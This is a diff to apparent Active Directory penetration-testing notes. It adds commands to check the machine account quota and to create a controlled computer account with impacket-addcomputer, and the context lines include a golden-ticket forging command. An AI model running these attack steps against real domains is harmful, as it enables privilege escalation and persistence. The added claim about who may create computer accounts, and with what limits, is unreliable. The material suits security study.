@@ -552,4 +552,25 @@ Get-ADDomain | Select-Object -ExpandProperty DomainSID
 impacket-ticketer -nthash 22ebc290e67668629c8d0812662a9c51  -domain-sid S-1-5-21-3716536509-2861296316-2740169710   -domain dry.martini.bars Administrator
 ```
 
-- 
+-----------------
+
+### Exploiting Machine quota for user
+
+----------------
+
+-  Only `Domain Admins` accounts should be able to create Computer accounts and it is limited to `10` for admins and `0` for users.
+-  Checking it out with `nxc`-:
+
+```bash
+nxc ldap -u "dev" -p "password" -dc-ip dc01.papa.local -M maq
+```
+
+<img width="1556" height="205" alt="image" src="https://github.com/user-attachments/assets/00b60706-8a4f-4bf5-a2ee-b001750e9d4e" />
+
+- It is created by making a request to the domain controller.
+
+```bash
+impacket-addcomputer -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
+```
+
+<img width="1678" height="152" alt="image" src="https://github.com/user-attachments/assets/4c71d3be-f677-4cfc-b980-3b0f2180edea" />
